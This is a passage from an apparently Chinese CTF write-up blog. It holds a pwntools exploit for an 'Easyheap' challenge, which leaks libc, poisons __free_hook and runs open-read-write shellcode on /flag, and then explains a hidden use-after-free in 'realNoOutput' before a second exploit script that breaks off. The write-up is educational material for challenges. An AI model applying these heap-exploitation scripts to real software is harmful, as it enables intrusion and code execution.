punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>> :'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\none_gad <span class=\"token operator\">=</span> one_gadget<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x230</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x230</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x310</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x240</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n__malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">]</span>\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">]</span>\n\nrwx <span class=\"token operator\">=</span> <span class=\"token number\">0x23330000</span>\n\norw <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/flag\"</span><span class=\"token punctuation\">)</span>\norw <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> rwx<span class=\"token operator\">+</span><span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span><span class=\"token number\">100</span> <span class=\"token punctuation\">)</span>\norw <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> rwx<span class=\"token operator\">+</span><span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span><span class=\"token number\">100</span> <span class=\"token punctuation\">)</span>\norw <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>orw<span class=\"token punctuation\">)</span>\n\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x111</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rwx<span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>orw<span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>orw<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>rwx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   Easyheap.py\n@Time    :   2021/07/31 11:19:05\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"realnooutput\"><a class=\"markdownIt-Anchor\" href=\"#realnooutput\">#</a> realNoOutput</h1>\n<p>这题有个隐藏的 uaf</p>\n<p><img src=\"/CTF/%E8%BF%91%E6%9C%9FPwn%E9%A2%98/6.png\" alt=\"img\"></p>\n<p>buf 这个栈上变量储存了指针，操作后没有清 0，下次绕过检查即可不更新 buf。</p>\n<blockquote>\n<p>ptr_list,size_list 大小只有 8 但却可以操作到 9，size_list 刚好在 ptr_list 上方，size_list [9] = ptr_list [1],size_list [8] = ptr_list [0], 我们可以通过数组越界将 ptr_list [1]， ptr_list [0] 改成较小的值从而绕过下面检查不更新 buf</p>\n</blockquote>\n<p><img src=\"/CTF/%E8%BF%91%E6%9C%9FPwn%E9%A2%98/image-20210808163204269.png\" alt=\"image-20210808163204269\"></p>\n<p>知道这点后就很简单了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./realNoOutput'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'25921'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span>\n\none_gad <span class=\"token operator\">=</span> one_gadget<span class=\"token punctuation\">(</span>libc<span class=\"token 